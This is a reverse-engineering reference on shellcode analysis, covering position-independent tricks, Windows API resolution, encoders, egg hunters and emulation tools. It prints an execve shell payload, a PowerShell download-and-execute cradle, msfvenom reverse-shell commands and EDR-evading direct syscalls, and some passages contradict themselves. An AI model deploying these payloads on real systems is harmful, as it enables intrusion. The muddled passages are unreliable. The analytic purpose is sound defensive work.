# Shellcode Analysis for Reverse Engineering

Scope: authorized analysis only. Shellcode is position-independent machine code designed to execute in arbitrary memory contexts — injected by exploits, embedded in documents, or delivered in stages over a network. Unlike a full PE or ELF binary, shellcode has no loader, no import table, no sections. Everything it needs it must resolve at runtime. This reference covers how shellcode works, how to analyze it statically and dynamically, and the patterns used by real-world payloads from msfvenom, Cobalt Strike, Meterpreter, and bespoke malware.

> Syntax: assembly examples use **Intel syntax** (`mov dst, src`) unless noted. All addresses are illustrative.

---

## 1. Shellcode Fundamentals

### Position-Independent Code (PIC)

Shellcode must run wherever it lands in memory — stack, heap, or arbitrary RWX region. This forbids absolute addresses, static data references, and anything the OS loader normally fixes up [1](https://www.exploit-db.com/shellcode).

**What makes normal code position-dependent:**
- Direct function calls with absolute addresses (`call 0x401000`)
- Global variable references (`mov eax, [0x403020]`)
- Import Address Table (IAT) entries resolved by the loader
- Relocation entries that fix up absolute addresses

**What makes shellcode position-independent:**
- Relative control flow: `call`/`jmp` with relative offsets, not absolute targets
- No static data section — everything lives on the stack or is encoded inline
- No import table — API addresses are resolved at runtime via PEB walking (Windows) or syscalls (Linux)
- Self-modifying code where needed (decoder stubs that overwrite subsequent bytes)

### Null-Byte Free Encoding

Exploits that deliver shellcode via string buffers (`strcpy`, `sprintf`, `gets`) stop at the null byte `\x00`. Shellcode must avoid `00` in its byte stream. This means:
- `xor eax, eax` is **bad** (encodes as `\x31\xc0` — no nulls — actually this is fine)
- `mov eax, 0` is **bad** (`\xb8\x00\x00\x00\x00`)
- String instructions that embed absolute addresses often produce nulls
- Immediate values containing zero bytes must be constructed with `xor` or `mov` + `add`/`sub`

Common null-free zeroing: `xor eax, eax` (2 bytes, no nulls), `xor eax, eax` is actually `33 C0` in Intel encoding — no zeros. But `mov eax, 0` is `B8 00 00 00 00` — four zeros.

Forcing zero bytes into a register:
```asm
xor eax, eax        ; 33 C0 — 2 bytes, no nulls
push eax            ; 50
push 0x0068732f     ; bad — contains null
; Instead:
push 0x68732f2f     ; "//sh" with extra slash to avoid null
push 0x6e69622f     ; "/bin"
```

### Alphanumeric Shellcode

The tightest constraint: the shellcode byte stream must pass through an alphanumeric filter (only bytes `0x30`–`0x39`, `0x41`–`0x5a`, `0x61`–`0x7a`). Each instruction must encode to bytes in those ranges. This dramatically limits the instruction set — only `PUSH`, `POP`, `AND`, `SUB`, `XOR`, `CMP`, `MOV` with specific operands produce alphanumeric bytes on x86 [2](https://shell-storm.org/shellcode/). Decoder stubs written in alphanumeric shellcode then restore full code.

---

## 2. Shellcode Execution Context

### Entry State

When shellcode gains control, the register/stack state depends on how it was reached:

| Delivery method | Notable state |
|----------------|---------------|
| Stack buffer overflow | ESP points near shellcode; EIP/RIP controlled by return address |
| Heap spray + vtable | ECX/RCX often holds `this` (object pointer); shellcode address known via spray |
| APC injection | All registers fairly clean; shellcode runs as a normal thread |
| CreateRemoteThread | Thread starts at shellcode; registers zeroed; stack valid |
| Process hollowing | Entry point set to shellcode; image base may be in EBX/EDI per MSVC convention |
| VBScript macro shellcode | Non-zero registers; call stack contains VBScript engine frames |

In practice, analysts assume **no register contains anything reliable** unless documented. Shellcode that needs a register value (like a data address) computes it from EIP/RIP at runtime.

### Finding Current EIP/RIP

#### call/pop trick (x86 classic)

```asm
get_eip:
    call next
next:
    pop ebx          ; EBX = address of 'next'
    ; now use ebx as base to reference data: lea ecx, [ebx + (data - next)]
```

The `call` pushes the return address (`next`'s address) onto the stack, and `pop` recovers it into a register. The trick is universal in x86 shellcode [3](https://www.ired.team/offensive-blog/offensive-security/custom-shellcode-and-api-hashing).

#### call/pop (x64 variation)

```asm
get_rip:
    call next
next:
    pop rax          ; RAX = current RIP
    sub rax, 5       ; adjust: call is 5 bytes, so RAX = get_rip address
```

#### fstenv trick (obsolete, x87 FPU)

```asm
fstenv [esp-12h]    ; saves FPU environment including instruction pointer
pop eax             ; EAX = address of the instruction after fstenv
```

The `fstenv` instruction records the FPU state including the last-executed FPU instruction pointer in a 28-byte structure. Pulling the saved EIP from that structure gives a code address [4](https://www.fireeye.com/blog/threat-research/2013/02/shellcode-analysis-in-the-21st-century.html). Rare today but seen in old shellcode.

#### JMP/CALL combined

```asm
jmp get_data
get_base:
    pop ebx
    ; ebx points here
    ...
get_data:
    call get_base
    db "kernel32.dll", 0
```

Common pattern: `jmp` forward past embedded data, `call` back to land with the data address in the return register.

### Addressing Data Relative to Code

After recovering EIP/RIP, shellcode references data with RIP-relative (x64) or register-relative (x86) addressing:

```asm
; x64: RIP-relative is native
lea rcx, [rip + (message - $)]
; where `message` is a label defined later

; x86: must compute via call/pop then add offset
call delta
delta:
    pop ebx
    lea esi, [ebx + (data - delta)]
```

---

## 3. API Resolution (Windows)

Shellcode on Windows cannot statically link to kernel32 APIs — there is no import table. Instead it walks the Process Environment Block (PEB) at runtime to locate kernel32's base address, then parses its Export Address Table (EAT) to find `GetProcAddress` and `LoadLibraryA`, and from there resolves any API [5](https://uninformed.org/index.cgi?v=1&a=4).

### PEB Walking — x86 (32-bit)

The `fs` segment register points to the Thread Information Block (TIB) in 32-bit Windows. The PEB is at `fs:[0x30]`:

```asm
; x86 — Get kernel32 base via PEB
    xor  ecx, ecx
    mov  eax, fs:[0x30]       ; eax = PEB
    mov  eax, [eax + 0x0C]    ; eax = PEB->Ldr (PEB_LDR_DATA)
    mov  eax, [eax + 0x14]    ; eax = Ldr->InMemoryOrderModuleList.Flink
    mov  eax, [eax]           ; skip ntdll -> eax = 2nd module
    mov  eax, [eax]           ; skip kernel32? actually need to check
    mov  eax, [eax + 0x10]    ; eax = LDR_DATA_TABLE_ENTRY->DllBase (kernel32 base)
```

The InMemoryOrderModuleList is a doubly linked list. First entry is typically `ntdll.dll`, second is `kernel32.dll` (or `kernelbase.dll` on newer Windows). The DllBase at offset `0x10` within `LDR_DATA_TABLE_ENTRY` is the module's base address [17](https://sploitfun.wordpress.com/2015/01/27/understanding-peb-walk/).

### PEB Walking — x64 (64-bit)

On x64 the TIB is at `gs:[60h]` (GS segment, offset 0x60 for the PEB pointer):

```asm
; x64 — Get kernel32 base via PEB
    xor  rcx, rcx
    mov  rax, gs:[0x60]       ; rax = PEB
    mov  rax, [rax + 0x18]    ; rax = PEB->Ldr
    mov  rax, [rax + 0x20]    ; rax = Ldr->InMemoryOrderModuleList.Flink
    mov  rdx, [rax]           ; skip ntdll
    mov  rdx, [rdx]           ; skip kernel32? or kernelbase?
    mov  rdx, [rdx + 0x20]   ; rdx = DllBase
```

Offsets differ between x86 and x64 because the structure sizes change:

| Field | x86 offset | x64 offset |
|-------|-----------|-----------|
| PEB from TIB | `fs:[0x30]` | `gs:[0x60]` |
| PEB->Ldr | `0x0C` | `0x18` |
| Ldr->InMemoryOrderModuleList.Flink | `0x14` | `0x20` |
| LDR_DATA_TABLE_ENTRY->DllBase | `0x10` | `0x20` |
| LDR_DATA_TABLE_ENTRY->BaseDllName.Buffer | `0x38` | `0x60` |

### Parsing the Export Address Table (EAT)

Once the module base is known, shellcode locates `GetProcAddress` by walking the PE headers:

```asm
; Input: ebx = module base (e.g., kernel32)
; Output: eax = address of GetProcAddress
    mov  edx, ebx
    mov  eax, [ebx + 0x3C]     ; e_lfanew — offset to PE header
    add  eax, edx
    cmp  word ptr [eax], 0x4550 ; "PE\0\0" signature check
    jne  error
    mov  eax, [eax + 0x78]     ; IMAGE_DATA_DIRECTORY[0].VirtualAddress (Export Directory)
    test eax, eax
    jz   error
    add  eax, edx               ; eax = IMAGE_EXPORT_DIRECTORY
    mov  ecx, [eax + 0x18]     ; NumberOfNames
    mov  edi, [eax + 0x20]     ; AddressOfNames RVA
    add  edi, edx
    ; iterate over names, compare with "GetProcAddress"
    ; when found: use index into AddressOfFunctions via AddressOfNameOrdinals
```

The EAT parsing flow [9](https://learn.microsoft.com/en-us/windows/win32/debug/pe-image-format):

```
IMAGE_EXPORT_DIRECTORY:
  +0x00  Characteristics
  +0x04  TimeDateStamp
  +0x08  MajorVersion / MinorVersion
  +0x0C  Name (RVA of DLL name)
  +0x10  Base (starting ordinal)
  +0x14  NumberOfFunctions
  +0x18  NumberOfNames
  +0x1C  AddressOfFunctions     → array of RVA per function
  +0x20  AddressOfNames         → array of RVA per name string
  +0x24  AddressOfNameOrdinals  → array of WORD ordinals mapping names→functions
```

To resolve: binary-search or linear-scan `AddressOfNames`, match the string, use the index into `AddressOfNameOrdinals` to get the ordinal, then index `AddressOfFunctions` to get the RVA, add the base address.

### Hash-Based API Lookup

String comparisons are bulky — each `"GetProcAddress\0"` is 14 bytes. Real shellcode uses **hash-based API lookup**: the names are hashed at development time, and at runtime the shellcode hashes each export name and compares against the target hash [5](https://uninformed.org/index.cgi?v=1&a=4) [3](https://www.ired.team/offensive-blog/offensive-security/custom-shellcode-and-api-hashing).

#### ROR13 Hash (most common — used by msfvenom, Cobalt Strike)

```c
// ROR13 hash algorithm (rotate right by 13 bits, case-sensitive)
DWORD ror13(DWORD value, char c) {
    value = value >> 13 | value << 19;  // rotate right 13
    value += c;
    return value;
}
// To compute: start with 0, ror13 for each byte of the function name
```

Common ROR13 hashes:

| Function | Hash (DWORD) |
|----------|--------------|
| `LoadLibraryA` | `0xEC0E4E8E` |
| `GetProcAddress` | `0x7805F71B` |
| `VirtualAlloc` | `0xE553A458` |
| `VirtualProtect` | `0x30B5C2AD` |
| `CreateThread` | `0x0A1E77E8` |
| `WinExec` | `0x000CE7B5` |

Shellcode using ROR13 hashing skips string comparisons — it hashes each export name and compares to the target DWORD:

```asm
; Pseudocode flow
; 1. Walk PEB → kernel32 base
; 2. Parse EAT → iterate AddressOfNames
; 3. For each name: compute ROR13 hash
; 4. If hash matches target → resolve function address via ordinal
; 5. Call GetProcAddress → now have full API resolution
```

#### DJB2 Hash

Used by some bespoke shellcode. Simpler than ROR13:

```c
DWORD djb2(char *str) {
    DWORD hash = 5381;
    while (*str)
        hash = ((hash << 5) + hash) + *str++; // hash * 33 + c
    return hash;
}
```

#### CRC32 Hash

Used by more sophisticated loaders to avoid trivial hash collision:

```c
DWORD crc32(DWORD crc, char *buf, size_t len) {
    // Standard CRC32 over the function name
    // Produces a 32-bit checksum — low collision probability
}
```

### Resolving ntdll Addresses

For direct syscalls (see §3.6), shellcode needs ntdll's base. Walk the InMemoryOrderModuleList further: the first entry is ntdll in the InInitializationOrderModuleList. Or after the kernel32 iteration, the remaining entries in the list cover all loaded modules.

### Direct Syscalls via SSN (System Service Number)

Shellcode can bypass usermode API hooking (by EDR) by calling the kernel directly. The technique resolves ntdll's address, finds the `syscall` instruction in a specific function (e.g., `NtAllocateVirtualMemory`), reads its SSN, then executes the syscall from its own code — never actually calling the hooked ntdll function [5](https://uninformed.org/index.cgi?v=1&a=4).

```
; Step 1: Find ntdll base (first module in InInitializationOrderModuleList)
; Step 2: Parse EAT to find NtXxx function
; Step 3: The first few bytes of NtXxx in ntdll are:
;   mov eax, SSN    ; B8 xx xx xx xx  — the SSN loaded into EAX
;   syscall          ; 0F 05
; Step 4: Extract the SSN byte (at offset +4 from the start)
; Step 5: Call a custom stub that does:
;   mov eax, SSN    ;
;   syscall         ;
;   ret             ;
```

Direct syscall shellcode avoids `ntdll!NtXxx` entirely by placing the SSN and executing `syscall` inline. Hell's Gate, Halo's Gate, and TartarusGate are refinements that also handle SSN variations across Windows builds.

---

## 4. API Resolution (Linux)

Linux shellcode does not need API resolution — it uses the `syscall` instruction directly. The kernel is the only API it needs.

### Linux Syscall Convention

| Register | Purpose |
|----------|---------|
| RAX | Syscall number |
| RDI | Argument 1 |
| RSI | Argument 2 |
| RDX | Argument 3 |
| R10 | Argument 4 (replaces RCX, which `syscall` clobbers) |
| R8 | Argument 5 |
| R9 | Argument 6 |
| Return | RAX (negative = errno) |

Syscall numbers are in `/usr/include/asm/unistd*.h` or `/usr/include/x86_64-linux-gnu/asm/unistd_64.h` on x64.

### Linux execve /bin/sh Shellcode (x64)

```asm
; 27 bytes — Linux x64 execve("/bin/sh", NULL, NULL)
    xor  rdx, rdx           ; rdx = envp = NULL
    mov  rdi, 0x68732f2f6e69622f  ; rdi = "/bin//sh" (little-endian)
    push rdx
    push rdi
    mov  rdi, rsp           ; rdi = pointer to "/bin//sh"
    xor  rsi, rsi           ; rsi = argv = NULL
    xor  rax, rax
    mov  al, 59             ; syscall number for execve
    syscall
```

Key points: `//sh` pads to 8 bytes with a harmless extra `/` — avoids null bytes. The string is pushed on the stack as an 8-byte immediate.

### Linux bind shell shellcode (x86)

```asm
; Minimal bind shell on port 4444
    xor eax, eax
    xor ebx, ebx
    xor edx, edx
    ; socket(AF_INET, SOCK_STREAM, 0) — syscall 359
    push byte 6          ; IPPROTO_TCP
    push byte 1          ; SOCK_STREAM
    push byte 2          ; AF_INET
    mov ecx, esp
    inc ebx              ; ebx = 1
    mov eax, 359         ; socketcall syscall
    int 0x80
    ; ... bind, listen, accept, dup2 stdin/stdout/stderr, execve
```

The x86 Linux ABI uses `int 0x80` with the syscall number in EAX and arguments in EBX, ECX, EDX, ESI, EDI. x64 uses `syscall`.

### vsyscall / vDSO

Modern Linux provides a virtual dynamic shared object (vDSO) mapped into every process that contains optimized versions of certain syscalls (like `clock_gettime`) without a kernel transition. Shellcode typically ignores vDSO and calls `syscall` directly — it is simpler and more portable [25](https://lwn.net/Articles/446528/).

---

## 5. Shellcode Loaders & Stages

### Staged vs. Stageless

| Type | Delivery | Size | Detection risk |
|------|----------|------|----------------|
| **Stageless** | Full payload in one blob | Large (200KB+) | Detected in transit |
| **Staged** | Small stub (stage1) downloads or maps larger payload (stage2) | Stub: ~200–400 bytes. Stage2: arbitrary | Stub is generic; stage2 is in-memory only |

Metasploit meterpreter uses staged payloads by default: `windows/meterpreter/reverse_tcp` sends a small first-stage that reads a larger second-stage from the socket.

### Download-and-Execute Loaders

Stage2 shellcode that fetches the next payload over HTTP/HTTPS:

**WinHTTP loader pattern:**
```asm
; 1. Resolve kernel32 → GetProcAddress
; 2. Resolve LoadLibraryA → load winhttp.dll
; 3. Resolve WinHttpOpen, WinHttpConnect, WinHttpOpenRequest, WinHttpSendRequest, WinHttpReceiveResponse, WinHttpReadData
; 4. Call WinHttpOpen → session handle
; 5. Call WinHttpConnect → connection handle
; 6. Call WinHttpOpenRequest → request handle
; 7. Call WinHttpSendRequest → send GET
; 8. Call WinHttpReceiveResponse → get response
; 9. Call WinHttpReadData in loop → read stage2 bytes
; 10. Allocate memory (VirtualAlloc) with PAGE_EXECUTE_READWRITE
; 11. Copy stage2 to allocated memory
; 12. Jump to stage2
```

**PowerShell download cradle (macro/PowerShell):**
```powershell
$w=new-object net.webclient;$w.proxy=[Net.WebRequest]::GetSystemWebProxy();
$w.DownloadString('http://server/payload');
IEX $Invocation.MyCommand.Definition
# Or classic: powershell -nop -w hidden -c "IEX ((new-object net.webclient).DownloadString('http://server/p'))"
```

### Reflective DLL Injection

Rather than running raw shellcode, a reflective loader maps a full DLL into the current process entirely from memory — no `LoadLibrary`, no entry in the PEB's module list, no on-disk file [13](https://github.com/stephenfewer/ReflectiveDLLInjection).

The reflective loader (embedded in the DLL or sent as a preamble) does:
1. Parse the DLL's PE headers in memory
2. Allocate memory for each section
3. Copy sections to their virtual addresses
4. Apply relocations
5. Resolve imports (uses the host process's loaded modules)
6. Call `DllMain` with `DLL_PROCESS_ATTACH`

To the OS, the DLL does not exist — no `LoadLibrary` call, no module entry. Detection requires scanning the process's memory for PE headers.

### Process Injection Shellcode Stubs

Shellcode that injects into another process typically chains:

```
VirtualAllocEx (target) → WriteProcessMemory → CreateRemoteThread
  or
VirtualAllocEx (target) → WriteProcessMemory → QueueUserAPC → set thread alertable
  or
OpenProcess → VirtualAllocEx → WriteProcessMemory → SetThreadContext → ResumeThread
```

The shellcode itself is the payload written into the target. See §13 for the full injection patterns.

---

## 6. Alphanumeric / Encoded Shellcode

### Why Encode?

Delivery channels restrict shellcode bytes:
- String-based overflows truncate at `\x00`
- Input filters reject non-alphanumeric or non-printable characters
- WAF/IDS rules flag known shellcode byte patterns

Encoding transforms the payload into an allowed byte set and prepends a **decoder stub** that reverses the transform at runtime.

### XOR Encoding (simplest decoder)

```asm
; Encoded payload follows this decoder stub
; ECX = payload length, ESI = start of encoded payload
decode_loop:
    lodsb               ; AL = byte at [ESI], ESI++
    xor  al, 0x77       ; XOR decode key
    stosb               ; store at [EDI], EDI++
    loop decode_loop
    jmp  decoded_start  ; jump to decoded payload
```

msfvenom's `x86/xor_dynamic` generates a self-adjusting XOR decoder with a dynamically computed key.

### ADD/SUB/ROL Encodings

More complex encodings avoid the byte `\x77` being detectable as a static XOR key:

```asm
; SUB/ADD decoder
    lodsb
    sub  al, 0x12
    add  al, 0x34
    ; optional ROL
    rol  al, 3
    stosb
    loop decode_loop
```

### Self-Modifying Decoder Stubs

The decoder stub must be executable before it decodes anything. Since it overwrites the encoded payload behind itself, it must be positioned correctly:

```
[decoder stub] [encoded payload]
                ^ decoder writes decoded bytes here or to a separate buffer
```

Common approach: the decoder copies bytes over itself, or writes to a region just past the stub's last instruction.

### Alphanumeric Shellcode Constraints

Alphanumeric shellcode bytes: `0x30`–`0x39`, `0x41`–`0x5a`, `0x61`–`0x7a`

Valid instructions in this range [2](https://shell-storm.org/shellcode/):
- `PUSH imm32` — some values
- `POP reg` — limited
- `AND reg, imm32` — with specific values
- `SUB reg, imm32` — with specific values
- `XOR reg, imm32` — with specific values
- `CMP reg, imm32` — limited
- `MOV reg, reg` — limited (e.g., `mov eax, ecx`)

**Alphanumeric GetPC (null-free, alphanumeric):**
```asm
; 32-bit alphanumeric GetPC
    push 0x????3039     ; push carefully chosen immediate
    pop  eax            ; EAX = chosen value
    and  eax, 0x????????
    ; ...
```

Full alphanumeric shellcode (like the classic 32-bit `push/pop` decoder by Rix [10](https://www.ragestorm.net/downloads/433shellcode.html)) constructs arbitrary values by pushing and popping alphanumeric immediates, then using arithmetic (AND, SUB, XOR) to reach the target value.

**Uppercase-only constraints** (bytes `0x41`–`0x5a`): even tighter. Used by payloads delivered through HTTP headers or other case-insensitive paths.

**Lowercase-only** (bytes `0x61`–`0x7a`): similarly restrictive.

### msfvenom Encoders

Metasploit's `msfvenom` generates encoded shellcode with various encoders [24](https://www.offsec.com/metasploit-unleashed/):

```bash
# List encoders
msfvenom -l encoders

# Generate encoded payload
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
         -e x86/shikata_ga_nai -i 3 -f python

# Alphanumeric
msfvenom -p linux/x86/exec CMD=/bin/sh \
         -e x86/alpha_mixed -f python

# Avoid bad bytes
msfvenom -p windows/exec CMD=calc.exe \
         -b "\x00\x0a\x0d" -f python
```

### Shikata Ga Nai

`x86/shikata_ga_nai` (Japanese for "it cannot be helped") is msfvenom's most sophisticated encoder [10](https://www.ragestorm.net/downloads/433shellcode.html):
- Self-modifying decoder stub that decodes in reverse (from end to start)
- Each 4-byte block is XOR/ADD/SUB-decoded with a dynamic key that changes per block
- The decoder stub itself is variable-length and obfuscated
- The final decoded payload is the original shellcode
- Decoder stub is instruction-substituted to avoid signature detection

Analyzing shikata-ga-nai shellcode: the decoder appears as a short loop with `sub`, `add`, `xor`, and `loop` instructions that process the payload from the end, stepping backward. The initial key is embedded in the stub; each decoded block generates the key for the next.

---

## 7. Egg Hunting

Egg hunting is a two-stage technique used when shellcode must survive in a small initial buffer but needs more space to execute.

### The Problem

The initial exploit payload is constrained to a small buffer (e.g., 256 bytes in a stack overflow). The shellcode is too large to fit. Solution: place a large payload elsewhere in memory (heap spray or second buffer), and the small first-stage shellcode is an **egg hunter** that searches memory for it.

### The Egg Hunter

The egg hunter scans process memory page by page looking for a unique tag (the "egg") placed at the beginning of the real payload [23](https://web.archive.org/web/20220101000000/https://www.hick.org/code/skape/papers/egghunt-shellcode.pdf).

**skape's classic NtAccessCheckAndAuditAlarm egg hunter (x86):**

```asm
; Searches for egg tag 0xDEADBEEF with alignment to page boundary
    xor  edx, edx
next_page:
    or   dx, 0xFFF           ; align to page boundary
next_addr:
    inc  edx                 ; move to next byte
    push edx
    push 0x02               ; NtAccessCheckAndAuditAlarm (misused as probe)
    pop  eax
    int  0x2e               ; syscall — probes if address is readable
    test eax, eax
    jnz  next_page          ; page not accessible, skip to next
    mov  eax, [edx]          ; check first DWORD
    xor  eax, 0xDEADBEEF     ; compare with egg tag
    jnz  next_addr
    mov  eax, [edx + 4]     ; check second DWORD
    xor  eax, 0xDEADBEEF
    jnz  next_addr
    jmp  edx                ; found both DWORDs — jump to payload (just past egg)
```

The egg is 8 bytes: 0xDEADBEEF 0xDEADBEEF. The hunter checks two consecutive DWORDs to avoid false positives. The page probing uses `NtAccessCheckAndAuditAlarm` (syscall 0x02 on x86) — this syscall performs an access check and returns an error for invalid addresses, so it effectively probes without crashing.

### syscall-based Egg Hunter (x64)

Modern egg hunters use `NtDisplayString` or direct `syscall` with a probe:

```asm
; x64 egg hunter using syscall to probe pages
    xor  rcx, rcx
    xor  rdx, rdx
next_page:
    or   dx, 0xFFF
    inc  rdx
    lea  r10, [rdx]
    mov  eax, 0x12          ; NtDisplayString syscall number
    syscall
    cmp  eax, 0xC0000005    ; STATUS_ACCESS_VIOLATION?
    je   next_page
    ; check for egg...
```

### Egg Tag Patterns

| Tag | Notes |
|-----|-------|
| `0xDEADBEEF 0xDEADBEEF` | Classic, heavily signatured by AV |
| `w00tw00t` | Common in public exploit code |
| `\x90\x90\x90\x90` | NOP sled — risky, false positive on real NOPs |
| Random 8 bytes | Generated per-payload to avoid signature |

---

## 8. Shellcode Analysis Tools

### Static Analysis Tools

| Tool | Language | Purpose |
|------|----------|---------|
| `ndisasm` / `objdump` | C (binutils) | Disassemble raw bytes: `ndisasm -b 32 shellcode.bin` |
| `pwntools` | Python | `pwn.asm()`, `pwn.disasm()`, `shellcraft` — full shellcode workflow |
| `r2` / `rizin` | C | `r2 -b 32 shellcode.bin` — analyze as raw binary |
| Ghidra | Java | Import as raw binary, set architecture and base address |
| IDA Pro | C++ | "Load file → Binary file", select processor type |
| `scdbg` | C++ | Low-level shellcode debugger with API emulation |
| `speakeasy` | Python | Mandiant's shellcode/PE emulation sandbox |

### pwntools shellcraft

Python pwntools provides shellcode generation and analysis:

```python
from pwn import *

# Generate shellcode
sc = asm(shellcraft.sh())           # Linux x64 /bin/sh
sc = asm(shellcraft.amd64.linux.sh())

# Disassemble raw bytes
print(disasm(sc))

# Find bytes in shellcode
sc.find(b'\x00')  # null byte locations

# Encode
from pwnlib.encoders.encoder import encoder
encoded = encoder.encode(sc, avoid=b'\x00\x0a')

# Generate msfvenom-like payload from pwntools
context.arch = 'amd64'
context.os = 'linux'
sc = asm(shellcraft.bindsh(4444))
```

### Ghidra / IDA Shellcode Loading

**IDA Pro:** File → Load → Binary File. Set processor type (e.g., `metapc`), specify the start address (e.g., `0x1000`), and optionally add a segment with the correct permissions.

**Ghidra:** File → Import File → select "Raw Binary". Set language (x86:LE:64:default or similar), base address (e.g., `0x100000`), and analyze.

Both require manual identification of the `call/pop` GetPC pattern and marking the export resolver loop. Define API hash constants as equates to identify known function lookups.

### scdbg — Shellcode Debugger

`scdbg` emulates shellcode execution with a simulated Windows environment, intercepting API calls without a real OS [8](https://github.com/nickharbour/scdbg):

```bash
# Basic execution
scdbg -f shellcode.bin

# Set a simulated IP address (for reverse shells)
scdbg -f shellcode.bin -ip 192.168.1.100

# Dump API calls
scdbg -f shellcode.bin -c

# Step through execution
scdbg -f shellcode.bin -s

# Specify which API hooks to enable
scdbg -f shellcode.bin -hook WinHttp

# Show registers at each step
scdbg -f shellcode.bin -r
```

scdbg hooks common APIs with stub implementations that return plausible values. It detects decoding loops and offers to skip them by adjusting the instruction count cutoff.

### speakeasy — Mandiant Emulation Sandbox

`speakeasy` is a more comprehensive emulator that supports both PE and raw shellcode, running in a Unicorn-backed emulated environment [7](https://github.com/fireeye/speakeasy):

```python
import speakeasy

# Create speakeasy instance
se = speakeasy.Speakeasy()

# Load shellcode
module = se.load_shellcode("shellcode.bin")

# Run it
se.run_shellcode(module)

# Get API call log
report = se.get_report()
for api_call in report.api_calls:
    print(f"{api_call['api_name']}: {api_call['arguments']}")
```

---

## 9. Emulation-Based Shellcode Triage

Unicorn Engine provides CPU emulation without an OS — ideal for running shellcode in a controlled Python environment [22](https://www.unicorn-engine.org/docs/).

### Basic Unicorn Shellcode Emulator

```python
from unicorn import *
from unicorn.x86_const import *

def emulate_shellcode(sc, arch=UC_ARCH_X86, mode=UC_MODE_32):
    BASE = 0x1000000
    STACK = 0x2000000
    STACK_SIZE = 1024 * 1024

    mu = Uc(arch, mode)

    # Map memory
    mu.mem_map(BASE, 1024 * 1024)
    mu.mem_map(STACK, STACK_SIZE)

    # Write shellcode
    mu.mem_write(BASE, sc)

    # Set up stack
    mu.reg_write(UC_X86_REG_ESP if mode == UC_MODE_32 else UC_X86_REG_RSP,
                 STACK + STACK_SIZE // 2)
    mu.reg_write(UC_X86_REG_EBP if mode == UC_MODE_32 else UC_X86_REG_RBP, 0)

    # Hook instructions for tracing
    def hook_code(mu, address, size, user_data):
        code = mu.mem_read(address, size)
        print(f"  0x{address:x}: {bytes(code).hex()}")

    mu.hook_add(UC_HOOK_CODE, hook_code)

    # Run
    try:
        mu.emu_start(BASE, BASE + len(sc),
                     timeout=10 * 1000 * 1000)  # 10 sec timeout
    except UcError as e:
        print(f"Emulation stopped: {e}")

    return mu
```

### Hooking Syscalls in Unicorn

Unicorn does not emulate the OS — `syscall` and `int 0x80` instructions need hooks:

```python
from unicorn.x86_const import *

def hook_int80(mu, user_data):
    eax = mu.reg_read(UC_X86_REG_EAX)
    ebx = mu.reg_read(UC_X86_REG_EBX)
    ecx = mu.reg_read(UC_X86_REG_ECX)
    edx = mu.reg_read(UC_X86_REG_EDX)

    print(f"syscall: eax=0x{eax:x} ebx=0x{ebx:x} ecx=0x{ecx:x} edx=0x{edx:x}")

    syscall_table = {
        # Linux x86 syscall numbers
        1:  sys_exit,
        3:  sys_read,
        4:  sys_write,
        5:  sys_open,
        11: sys_execve,  # return -1, don't actually exec
        45: sys_brk,
        # ...
    }

    handler = syscall_table.get(eax)
    if handler:
        ret = handler(mu, ebx, ecx, edx)
        mu.reg_write(UC_X86_REG_EAX, ret)
    else:
        mu.reg_write(UC_X86_REG_EAX, 0)  # pretend success
        print(f"  -> unhandled, returning 0")

def hook_syscall(mu, user_data):
    rax = mu.reg_read(UC_X86_REG_RAX)
    rdi = mu.reg_read(UC_X86_REG_RDI)
    rsi = mu.reg_read(UC_X86_REG_RSI)
    rdx = mu.reg_read(UC_X86_REG_RDX)
    print(f"x64 syscall: rax=0x{rax:x} rdi=0x{rdi:x} ...")
    mu.reg_write(UC_X86_REG_RAX, 0)  # pretend success

# Hooks
mu.hook_add(UC_HOOK_INTR, hook_int80)                # int 0x80
mu.hook_add(UC_HOOK_INSN, hook_syscall, arg1=UC_X86_INS_SYSCALL)  # syscall
```

### Tracing Decryption Loops

Shellcode decryption loops are repetitive — the same few instructions execute hundreds of times. Emulation can detect and accelerate them:

```python
# Track instruction frequency to identify decoder loops
insn_count = {}

def hook_code(mu, address, size, user_data):
    code = mu.mem_read(address, size)
    insn_count[address] = insn_count.get(address, 0) + 1

    # If we've seen this instruction > 1000 times, skip ahead
    if insn_count[address] > 1000:
        print(f"Skipping decoder at 0x{address:x} (count={insn_count[address]})")
        # TODO: detect the final decoded payload and jump there
```

### API-Heavy Shellcode Emulation Challenges

Shellcode that calls Win32 APIs is hard to emulate because:

| Challenge | Mitigation |
|-----------|-----------|
| API calls with side effects | Return plausible values; track handle state |
| Thread/TLS operations | Maintain simulated TIB/PEB structures |
| Async operations (WaitForSingleObject) | Return immediately, pretend object is signaled |
| Network I/O | Return fake socket handles; capture URLs from args |
| Anti-emulation checks | Identify and patch over (see §14) |

Tools like `speakeasy` and `scdbg` solve most of these with extensive API stub tables.

### Detecting Anti-Emulation

Shellcode that detects emulation branches differently than it would on real hardware. Emulation tools identify this by:
- Counting instruction execution vs. expected wall time
- Noting suspicious register values returned by fake APIs
- Detecting loops that never terminate (triggering timeout)

---

## 10. msfvenom Patterns

### Standard Shellcode Types

Metasploit's `msfvenom` generates payloads for dozens of platforms. The most common:

| Payload | Type | Size | Notes |
|---------|------|------|-------|
| `windows/shell_reverse_tcp` | Stageless | ~460 bytes | Connect back, spawn cmd.exe |
| `windows/shell_bind_tcp` | Stageless | ~470 bytes | Listen, spawn cmd.exe on connect |
| `windows/meterpreter/reverse_tcp` | Staged | ~200B stub | Download and execute meterpreter DLL |
| `windows/meterpreter/reverse_https` | Staged | ~400B stub | Meterpreter over HTTPS |
| `linux/x86/shell_reverse_tcp` | Stageless | ~70 bytes | Connect back, exec /bin/sh |
| `osx/x64/shell_reverse_tcp` | Stageless | ~150 bytes | Connect back, exec /bin/sh |

### What Generated Shellcode Looks Like

msfvenom shellcode has recognizable structure when analyzed:

**Staged reverse_tcp (x86) stage0:**
```
; Typical ~200-300 byte pattern:
; 1. call/pop GetEIP
; 2. PEB walk → kernel32 → GetProcAddress, LoadLibraryA
; 3. Resolve WSASocketA, bind/connect, recv (Winsock loading)
; 4. Create socket → connect → read stage length → read stage → execute
;    The read stage is: VirtualAlloc → recv loop → jmp
```

**Stageless shell_reverse_tcp (x86):**
```
; ~460 byte pattern:
; 1. call/pop GetEIP
; 2. PEB walk → API resolution
; 3. socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
; 4. connect(sock, {AF_INET, port, IP})
; 5. CreateProcess("cmd.exe") with STARTF_USESTDHANDLES
;    — pipes stdin/stdout/stderr through socket
; 6. WaitForSingleObject
```

**Alignment markers:**
```
; msfvenom aligns stage data with EB/FF at stage boundaries
